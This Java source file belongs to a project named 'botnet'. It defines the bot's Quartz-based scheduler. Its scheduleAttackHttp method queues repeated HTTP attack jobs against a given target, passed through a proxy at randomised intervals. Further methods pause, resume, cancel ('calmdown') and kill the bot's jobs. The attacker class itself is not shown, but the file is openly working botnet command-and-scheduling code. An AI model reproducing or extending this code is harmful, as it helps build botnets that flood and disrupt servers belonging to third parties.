/*
  The MIT License (MIT)

  Copyright (c) 2016 Giacomo Marciani and Michele Porretta

  Permission is hereby granted, free of charge, to any person obtaining a copy
  of this software and associated documentation files (the "Software"), to deal
  in the Software without restriction, including without limitation the rights
  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
  copies of the Software, and to permit persons to whom the Software is
  furnished to do so, subject to the following conditions:


  The above copyright notice and this permission notice shall be included in
  all copies or substantial portions of the Software.


  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.  IN NO EVENT SHALL THE
  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
  THE SOFTWARE.
 */

package com.acmutv.botnet.core.exec;

import com.acmutv.botnet.core.attack.HttpAttack;
import com.acmutv.botnet.core.attack.QuartzHttpAttacker;
import lombok.Data;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.quartz.*;
import org.quartz.impl.StdSchedulerFactory;
import org.quartz.impl.matchers.GroupMatcher;

import java.util.concurrent.ExecutorService;

/**
 * This class realizes bot's thread pool, both fixed and scheduled.
 * @author Giacomo Marciani {@literal <gmarciani@acm.org>}
 * @author Michele Porretta {@literal <mporretta@acm.org>}
 * @since 1.0
 * @see ExecutorService
 */
@Data
public class QuartzPool {

  private static final Logger LOGGER = LogManager.getLogger(QuartzPool.class);

  private static final String JOB_GROUP_ATTACKS_HTTP = "ATTACK_HTTP";

  /**
   * The jobs search key that matches all jobs.
   */
  private static final GroupMatcher<JobKey> JOB_GROUP_ALL = GroupMatcher.anyJobGroup();

  /**
   * The job search key that matches ATTACK* jobs.
   */
  private static final GroupMatcher<JobKey> JOB_GROUP_ATTACKS = GroupMatcher.jobGroupStartsWith("ATTACK");

  /**
   * The job search key that matches SAMPLER* jobs.
   */
  private static final GroupMatcher<JobKey> JOB_GROUP_SAMPLERS = GroupMatcher.jobGroupStartsWith("SAMPLER");

  /**
   * The Quartz scheduler.
   */
  private Scheduler scheduler;

  /**
   * Construct a new pool, allocating a new Quartz scheduler.
   * @throws SchedulerException when the Quartz scheduler cannot be created.
   */
  public QuartzPool() throws SchedulerException {
    final SchedulerFactory factory = new StdSchedulerFactory();
    this.scheduler = factory.getScheduler();
  }

  /**
   * Schedules the {@code attack}.
   * @param attack the attack to schedule.
   * @throws SchedulerException when the attack cannot be scheduled.
   */
  public void scheduleAttackHttp(HttpAttack attack) throws SchedulerException {
    final JobKey jobKey = JobKey.jobKey(JOB_GROUP_ATTACKS_HTTP);
    final TriggerKey triggerKey = TriggerKey.triggerKey(JOB_GROUP_ATTACKS_HTTP);

    JobDataMap jdata = new JobDataMap();
    jdata.put("method", attack.getMethod());
    jdata.put("target", attack.getTarget());
    jdata.put("proxy", attack.getProxy());
    jdata.put("properties", attack.getProperties());
    jdata.put("executions", attack.getExecutions());

    JobDetail job = JobBuilder.newJob(QuartzHttpAttacker.class)
        .withIdentity(jobKey)
        .build();

    final long intervalMillis = attack.getPeriod().getRandomDuration().toMillis();
    final int repetitions = attack.getExecutions() - 1;

    Trigger trigger = TriggerBuilder.newTrigger()
        .withIdentity(triggerKey)
        .withSchedule(SimpleScheduleBuilder.simpleSchedule()
            .withIntervalInMilliseconds(intervalMillis)
            .withRepeatCount(repetitions)
        )
        .build();

    this.scheduler.scheduleJob(job, trigger);
  }


  /**
   * Pauses all jobs in pool.
   * @throws SchedulerException when jobs cannot be paused.
   */
  public void pause() throws SchedulerException {
    LOGGER.trace("Pausing scheduler...");
    this.scheduler.pauseAll();
    LOGGER.trace("Scheduler paused");
  }

  /**
   * Resume all jobs in pool.
   * @throws SchedulerException when jobs cannot be resumed.
   */
  public void resume() throws SchedulerException {
    LOGGER.trace("Resuming scheduler...");
    this.scheduler.resumeAll();
    LOGGER.trace("Scheduler resumed");
  }

  /**
   * Deletes all attacking jobs.
   */
  public void calmdown() throws SchedulerException {
    LOGGER.trace("Deleting all attacks from scheduler...");
    for (JobKey jk : this.scheduler.getJobKeys(JOB_GROUP_ATTACKS)) {
      this.scheduler.deleteJob(jk);
    }
    LOGGER.trace("All attacks deleted from scheduler");
  }

  /**
   * Delets all jobs.
   */
  public void kill() throws SchedulerException {
    LOGGER.trace("Deleting all scheduled jobs...");
    for (JobKey jk : this.scheduler.getJobKeys(JOB_GROUP_ALL)) {
      this.scheduler.deleteJob(jk);
    }
    LOGGER.trace("All jobs deleted from scheduler");
  }

  /**
   * Shuts down the scheduler, clearing all its data.
   * @param wait if true, waits for job to complete; if false destroy the scheduler immediately.
   * @throws SchedulerException when the scheduler cannot be shut down.
   */
  public void destroy(boolean wait) throws SchedulerException {
    LOGGER.trace("Shutting down scheduler...");
    this.scheduler.shutdown(wait);
    LOGGER.trace("Scheduler shut down");
    LOGGER.trace("Clearing scheduler data...");
    this.scheduler.clear();
    LOGGER.trace("Scheduler data cleared");
  }

}
